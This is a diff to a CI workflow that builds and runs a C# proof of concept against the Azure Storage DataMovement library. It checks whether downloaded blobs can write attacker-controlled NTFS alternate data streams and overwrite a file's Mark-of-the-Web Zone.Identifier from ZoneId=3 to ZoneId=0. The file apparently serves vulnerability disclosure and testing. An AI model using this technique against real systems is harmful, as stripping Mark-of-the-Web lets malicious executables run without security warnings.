@@ -19,31 +19,69 @@ jobs:
           using Azure.Storage.DataMovement;
           using Azure.Storage.DataMovement.Blobs;
 
+          int failures = 0;
+
+          void Check(string name, bool condition, string detail)
+          {
+              string result = condition ? "PASS" : "FAIL";
+              Console.WriteLine($"[{result}] {name} -- {detail}");
+              if (!condition) failures++;
+          }
+
           var connStr = Environment.GetEnvironmentVariable("AZURE_STORAGE_CONNECTION_STRING");
           var container = new BlobContainerClient(connStr, "test-container");
-          var dest = Path.Combine(Path.GetTempPath(), "ads-poc-" + Guid.NewGuid());
-          Directory.CreateDirectory(dest);
 
-          var preExisting = Path.Combine(dest, "legituser.exe");
-          File.WriteAllBytes(preExisting, new byte[]{0x4D,0x5A});
+          // ---------- Scenario 1: unconditional ADS smuggling into a NEW file ----------
+          var dest1 = Path.Combine(Path.GetTempPath(), "ads-poc-s1-" + Guid.NewGuid());
+          Directory.CreateDirectory(dest1);
+          var probePath = Path.Combine(dest1, "probe.txt");
+
+          Console.WriteLine("=== SCENARIO 1: unconditional ADS write on a new file ===");
+          var t1 = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest1);
+          Console.WriteLine($"TransferState={t1.Status.State} HasFailedItems={t1.Status.HasFailedItems}");
+
+          bool baseFileExists = File.Exists(probePath);
+          string adsContent = "";
+          bool adsReadOk = false;
+          try
+          {
+              adsContent = File.ReadAllText(probePath + ":simple-ads.bin");
+              adsReadOk = true;
+          }
+          catch { }
+
+          Check("S1-base-file-written", baseFileExists, $"probe.txt exists={baseFileExists}");
+          Check("S1-attacker-ADS-written", adsReadOk && adsContent.Contains("ATTACKER"),
+              $"probe.txt:simple-ads.bin readable={adsReadOk}, content=\"{adsContent.Trim()}\"");
+
+          // ---------- Scenario 2: MOTW overwrite on a PRE-EXISTING file (requires OverwriteIfExists) ----------
+          var dest2 = Path.Combine(Path.GetTempPath(), "ads-poc-s2-" + Guid.NewGuid());
+          Directory.CreateDirectory(dest2);
+          var preExisting = Path.Combine(dest2, "legituser.exe");
+
+          File.WriteAllBytes(preExisting, new byte[] { 0x4D, 0x5A });
           File.WriteAllText(preExisting + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\n");
+          string before = File.ReadAllText(preExisting + ":Zone.Identifier");
 
-          Console.WriteLine("--- BEFORE ---");
-          Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier"));
+          Console.WriteLine("=== SCENARIO 2: MOTW overwrite on a pre-existing file (CreationMode=OverwriteIfExists) ===");
+          Console.WriteLine($"BEFORE: {before.Trim()}");
 
           var options = new BlobContainerClientTransferOptions
           {
               TransferOptions = new TransferOptions { CreationMode = StorageResourceCreationMode.OverwriteIfExists }
           };
-          var transfer = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest, options);
-          Console.WriteLine($"TRANSFER_STATE={transfer.Status.State}");
-          Console.WriteLine($"HAS_FAILED_ITEMS={transfer.Status.HasFailedItems}");
+          var t2 = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest2, options);
+          Console.WriteLine($"TransferState={t2.Status.State} HasFailedItems={t2.Status.HasFailedItems}");
 
-          Console.WriteLine("--- AFTER ---");
-          try { Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier")); }
-          catch (Exception ex) { Console.WriteLine($"ERROR: {ex.Message}"); }
+          string after = File.ReadAllText(preExisting + ":Zone.Identifier");
+          Console.WriteLine($"AFTER: {after.Trim()}");
+
+          Check("S2-MOTW-overwritten", before.Contains("ZoneId=3") && after.Contains("ZoneId=0"),
+              $"before=\"{before.Trim()}\" after=\"{after.Trim()}\"");
+
+          Console.WriteLine($"=== SUMMARY: {(failures == 0 ? "ALL CHECKS PASSED (vulnerability confirmed)" : failures + " CHECK(S) FAILED")} ===");
           '@
-      - name: Run download
+      - name: Run PoC
         shell: pwsh
         run: dotnet run --project poc
         env:
